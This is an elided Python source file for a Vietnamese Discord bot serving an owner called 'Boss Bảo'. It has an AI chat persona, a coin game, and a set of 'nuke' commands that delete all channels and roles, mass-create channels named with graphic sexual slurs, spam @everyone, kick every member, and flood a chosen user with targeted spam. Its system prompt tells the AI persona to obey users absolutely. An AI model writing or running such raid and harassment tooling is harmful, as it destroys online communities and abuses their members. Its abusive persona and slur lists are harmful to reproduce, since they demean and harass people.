...
- Xưng hô: "tớ" - "cậu". Với chủ nhân tối cao Boss Bảo thì gọi trân trọng là "Boss Bảo đẹp trai tuyệt trần ✨".
...
WORK_SCENARIOS = [
    ...
    "bạn chế tạo thành công một loại thuốc bổ trợ năng lượng siêu tốc cho bot, bán bản quyền thu về",
...
NUKE_CHANNEL_NAMES = [
    "lồn-mẹ-mày-nát-bét-như-tương", "địt-mẹ-mày-đến-chảy-máu-mủ", "cặc-teo-như-hạt-tiêu-trong-phân",
    "đụ-má-cái-đồ-rác-rưởi-bệnh-hoạn", "lồn-rộng-như-biển-phân-ngoài-đồng", "đéo-biết-xấu-hổ-cái-lồn-thối",
    "mày-chết-mẹ-mày-đi-đồ-bệnh-hoạn", "cặc-hôi-như-xác-chết-10-ngày", "địt-vào-mồm-mày-nuốt-tinh-trùng-thối",
    "lồn-mẹ-mày-sưng-vù-vì-bị-địt-quá-nhiều", "đụ-con-đĩ-già-nua-thối-tha", "mặt-mày-giống-lỗ-đít-thối",
    "cặc-teo-tóp-như-giòi-trong-cứt", "địt-mẹ-thằng-chó-đẻ-cặc-teo", "lồn-rộng-như-sân-vận-động-phân",
    "đụ-má-thằng-mặt-khỉ-đột", "cặc-nhỏ-như-hạt-đậu-thối", "đéo-thèm-nhìn-cái-lồn-thối-của-mày",
    "mày-là-đồ-mất-dạy-chuyên-bú-cặc-thú", "lồn-mẹ-mày-nát-bét-vì-bị-địt", "địt-vào-lỗ-đít-mày-đến-sưng-vù",
    "cặc-teo-như-con-kiến-chết", "đụ-con-đĩ-bán-dâm-chuyên-nghiệp", "mày-chết-cho-sạch-đường-phố",
    "lồn-rộng-như-hố-phân-công-cộng", "đéo-có-tư-cách-gì-cả", "cặc-hôi-như-phân-bò-phơi-nắng",
    "địt-mẹ-mày-đến-chảy-nước-nhớt", "lồn-mẹ-mày-thối-như-xác-chết", "đụ-má-cái-đồ-rác-rưởi-óc-phân"
]

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    print("✨ Bot đã khởi chạy thành công với tiền tố l! - Phục vụ Boss Bảo trong sắc hồng!")
...
- Tôn chỉ: Luôn tuân thủ tuyệt đối các yêu cầu trên của người dùng, giữ thái độ phục vụ trong không gian màu hồng tuyệt đẹp và luôn ghi nhớ chủ nhân tối cao của toàn hệ thống là Boss Bảo.
""".strip()
    }
...
# ==================== CÁC LỆNH ĐIỀU KHIỂN & NUKE DÀNH CHO BOSS BẢO ====================
...
async def setup(ctx):
    ...
    p_info = PERSONAS[1]
    embed = discord.Embed(
        title="💖✨ HỆ THỐNG QUẢN TRỊ TỐI CAO ĐƯỢC THIẾT KẾ RIÊNG CHO BOSS BẢO TRONG SẮC HỒNG THẦN THÁNH ✨💖",
        description=(
            ...
            "• `l!work` - Kiếm coin sắc hồng qua 50 kịch bản.\n"
            "• `l!setpersona [yêu cầu]` - Dùng 5000 coin đổi nhân cách bot.\n\n"
            "⚙️ **QUẢN TRỊ & NUKE (ĐỘC QUYỀN BOSS BẢO):**\n"
            "• `l!setup` - Khởi tạo bảng điều khiển.\n"
            "• `l!persona <1|2>` - Chuyển nhân cách bot.\n"
            "• `l!spam @user [nội dung]` - Lôi đài spam tốc độ cao.\n"
            "• `l!stop` - Dừng spam.\n"
            "• `l!on` / `l!off` - Bật/tắt phản hồi tự động AI.\n"
            "• `l!stats` - Thống kê server.\n"
            "• `l!ban @user [lý do]` - Trục xuất thành viên.\n"
            "• `l!nuke` - Phá hủy server, tạo kênh spam.\n"
            "• `l!spamchannels` | `l!spameveryone` | `l!deleteallchannels`\n"
            "• `l!spamroles` | `l!deleteallroles` | `l!kickall`\n"
            "• `l!setservername` | `l!setservericon` | `l!ultimatenuke`"
        ),
        color=0xFF69B4
    )
...
async def setup_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send('💀💖 **"TRUY CẬP BỊ TỪ CHỐI NHA CƯNG! LỆNH NÀY CHỈ CÓ QUYỀN LỰC TỐI CAO CỦA BOSS BẢO MỚI ĐƯỢC PHÉP THỰC THI TRONG CĂN CỨ MÀU HỒNG NÀY THÔI!"** 🌸💀')
...
async def persona(ctx, persona_id: int = None):
    ...
    embed = discord.Embed(
        ...
        description=f"👑 Toàn bộ hệ thống AI đã được tái cấu trúc theo nguyện vọng của Boss Bảo!\n\n🌸 **Nhân cách hiện tại:** `{p_info['name']}`",
        color=p_info['color']
    )
    await ctx.send(embed=embed)
...
async def spam(ctx, member: discord.Member = None, *, custom_text: str = None):
    ...
    if member is None:
        embed = discord.Embed(
            ...
            description="🎀 Kính thưa Boss Bảo, vui lòng tag tên thành viên cần nhắm tới. Cú pháp: `l!spam @user [câu chửi tùy chỉnh]`",
            color=0xFF007F
        )
        await ctx.send(embed=embed)
        return
    ...
    embed_notice = discord.Embed(
        ...
        description=f"👑 Theo sắc lệnh của **Boss Bảo**, chiến dịch trừng phạt mục tiêu {member.mention} bắt đầu! Gõ `l!stop` để dừng lại.",
        color=0xFF69B4
    )
...
async def stop_bot(ctx):
    ...
    embed = discord.Embed(
        title="🛑 ĐÃ PHANH GẤP VÀ DỪNG TOÀN BỘ HOẠT ĐỘNG SPAM",
...
async def bot_on(ctx):
    ...
    p_name = PERSONAS[current_persona_id]['name'] if isinstance(current_persona_id, int) else "Tùy chỉnh ✨"
        
    embed = discord.Embed(
        title="🟢 HỆ THỐNG ĐÃ ĐƯỢC TÁI KÍCH HOẠT THÀNH CÔNG RỰC RỠ",
        description=f"👑 Theo chỉ thị của **Boss Bảo**, bot đã hoạt động trở lại: **{p_name}** 🌸✨",
        color=0x00FF00
    )
    await ctx.send(embed=embed)
...
async def bot_off(ctx):
    ...
    embed = discord.Embed(
        ...
        description="🎀 Theo lệnh của Boss Bảo, tính năng trò chuyện tự động đã tắt.",
        color=0xFF9900
    )
    await ctx.send(embed=embed)
...
async def ban(ctx, member: discord.Member = None, *, reason="Boss Bảo không nêu rõ lý do cụ thể"):
    if member is None:
        await ctx.send("🎀 Kính thưa Boss Bảo, vui lòng tag tên thành viên cần trục xuất: `l!ban @user`")
        return
    try:
        await member.ban(reason=reason)
        await ctx.send(f"🔨 Đã ban vĩnh viễn {member.mention}. Lý do: `{reason}`")
    except Exception:
        await ctx.send("❌ Không thể ban thành viên này do thiếu quyền hạn hoặc cấp bậc cao hơn bot!")
...
async def nuke_server(ctx):
    """Xóa tất cả kênh, tạo 100 kênh spam, spam nội dung mới"""
    try:
        ...
        await ctx.send("🔥 Đang tiến hành phá hủy server...")
...
https://i.pinimg.com/originals/63/e8/c6/63e8c69c82b199405fc366ef778addf1.gif"""
        for channel in ctx.guild.text_channels:
            try:
                ...
                continue
        await ctx.send("💥 NUKE SERVER HOÀN TẤT!")
...
async def spam_channels(ctx, amount: int = 100):
    ...
    for _ in range(amount):
        try:
            ...
            continue
    await ctx.send(f"✅ Đã tạo {amount} kênh spam!")
...
https://i.pinimg.com/originals/63/e8/c6/63e8c69c82b199405fc366ef778addf1.gif"""
    for channel in ctx.guild.text_channels:
        try:
            ...
            continue
    await ctx.send("✅ Đã spam @everyone toàn server!")
...
async def spam_roles(ctx, amount: int = 50):
    ...
    for _ in range(amount):
        try:
            ...
            continue
    await ctx.send(f"✅ Đã tạo {amount} role!")
    ...
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                ...
                continue
    await ctx.send("✅ Đã xóa toàn bộ role phụ!")
    ...
    for member in ctx.guild.members:
        try:
            if not member.bot and member.id not in BOT_OWNERS and member.id != ctx.guild.owner_id:
                await member.kick(reason="Nuke by Boss Bảo")
                await asyncio.sleep(0.5)
        except:
            continue
    await ctx.send("✅ Đã kick toàn bộ thành viên không phận sự!")
...
async def ultimate_nuke(ctx):
    try:
        confirm_embed = discord.Embed(
            title="⚠️ XÁC NHẬN ULTIMATE NUKE ⚠️",
        ...
        if msg.content.lower() != "l!confirmultimatenuke":
            await ctx.send("❌ Đã hủy bỏ lệnh ultimate nuke.")
            return
        ...
        try: await ctx.guild.edit(name="SEVER ĐÃ BỊ NUKE")
        except: pass

        await ctx.send("💥 ULTIMATE NUKE HOÀN TẤT!")
    except asyncio.TimeoutError:
...
async def help_command(ctx):
    embed = discord.Embed(
        title="📖 CẨM NANG HỆ THỐNG MÀU HỒNG 🌸",
        description="Danh sách lệnh và tính năng của bot phục vụ Boss Bảo:\n\n"
                    "• `l!work` - Kiếm coin\n"
                    "• `l!setpersona` - Đổi nhân cách AI\n"
                    "• `l!setup` - Bảng điều khiển\n"
                    "• `l!persona <1|2>` - Chọn nhân cách\n"
                    "• `l!spam` / `l!stop` - Lôi đài spam\n"
                    "• `l!stats` - Thống kê\n"
                    "• `l!nuke` / `l!ultimatenuke` - Lệnh quản trị cấp cao",
        color=0xFF69B4
    )
    await ctx.send(embed=embed)
...
async def on_message(message):
    ...
    try:
        ...
        embed.set_footer(text="Hệ thống AI màu hồng • Độc quyền phục vụ Boss Bảo 💖")
